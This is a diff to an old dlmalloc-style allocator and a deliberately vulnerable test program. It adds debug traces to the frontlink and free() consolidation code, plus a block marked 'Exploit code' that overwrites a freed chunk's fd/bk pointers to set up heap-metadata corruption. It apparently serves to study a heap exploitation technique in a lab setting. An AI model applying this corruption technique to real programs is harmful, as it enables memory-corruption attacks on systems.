@@ -1135,6 +1135,7 @@ static void do_check_malloced_chunk(p, s) mchunkptr p; size_t s;
 {                                                                             \
   if (S < MAX_SMALLBIN_SIZE)                                                  \
   {                                                                           \
+    fprintf(stderr, "[-] Initial 'if' block executed.\n"); fflush(stderr);          \
     IDX = smallbin_index(S);                                                  \
     mark_binblock(IDX);                                                       \
     BK = bin_at(IDX);                                                         \
@@ -1145,15 +1146,22 @@ static void do_check_malloced_chunk(p, s) mchunkptr p; size_t s;
   }                                                                           \
   else                                                                        \
   {                                                                           \
+    fprintf(stderr, "[-] 'Else' block executed.\n"); fflush(stderr);                \
     IDX = bin_index(S);                                                       \
     BK = bin_at(IDX);                                                         \
     FD = BK->fd;                                                              \
+    fprintf(stderr, "[-] Before looping. FD=%p BK=%p\n", FD, BK); fflush(stderr); \
     if (FD == BK) mark_binblock(IDX);                                         \
     else                                                                      \
     {                                                                         \
-      while (FD != BK && S < chunksize(FD)) FD = FD->fd;                      \
+      while (FD != BK && S < chunksize(FD)) { \
+                                             fprintf(stderr, ">>> FD=%p FD->fd=%p\n", FD, FD->fd); fflush(stderr); \
+                                             FD = FD->fd;                      \
+                                             } \
       BK = FD->bk;                                                            \
+      fprintf(stderr, "Outside loop. BK=%p\n", BK); \
     }                                                                         \
+    fprintf(stderr, "[-] FD=%p BK=%p\n", FD, BK); fflush(stderr);    \
     P->bk = BK;                                                               \
     P->fd = FD;                                                               \
     FD->bk = BK->fd = P;                                                      \
@@ -1770,6 +1778,7 @@ void fREe(mem) Void_t* mem;
 
   islr = 0;
 
+  fprintf(stderr, "[x] About to perform backward consolidation\n"); fflush(stderr);
   if (!(hd & PREV_INUSE))                    /* consolidate backward */
   {
     prevsz = prev_size(p);
@@ -1782,6 +1791,7 @@ void fREe(mem) Void_t* mem;
       unlink(p, bck, fwd);
   }
   
+  fprintf(stderr, "[x] About to perform forward consolidation\n"); fflush(stderr);
   if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
   {
     sz += nextsz;
@@ -1798,8 +1808,10 @@ void fREe(mem) Void_t* mem;
 
   set_head(p, sz | PREV_INUSE);
   set_foot(p, sz);
-  if (!islr)
+  if (!islr) {
+    fprintf(stderr, "[x] About to perform frontlinking P=%p S=%lu IDX=%d BK=%p FD=%p\n", p, sz, idx, bck, fwd); fflush(stderr);
     frontlink(p, sz, idx, bck, fwd);  
+  }
 }
 
 
@@ -2544,6 +2556,7 @@ void winner()
 int main(int argc, char **argv)
 {
   char *first, *second, *third, *fourth, *fifth, *sixth;
+  int i;
 
   fprintf(stderr, "Allocating space for first\n"); fflush(stderr);
   first = malloc(strlen(argv[2])+1);
@@ -2560,8 +2573,28 @@ int main(int argc, char **argv)
 
   strcpy(first, argv[2]);
   free(fifth);
+
+
+
+  /* ================================================================================================ */
+  /* Exploit code */
+  char *t = fourth;
+  int *tt;
+  i = fifth-fourth;    // at the data portion of `fifth` we have its FD and BK now that its been freed
+  t += i;
+
+  printf("t=%p\n", t);
+  tt = (int *)t;
+  *tt = (int)first - 8;
+  tt += 1;
+  *tt = 0x45464748;
+
+
+
+  /* Regular code */
   strcpy(fourth, argv[1]);
   free(second);
+
 
   printf("dynamite failed?\n");
 }
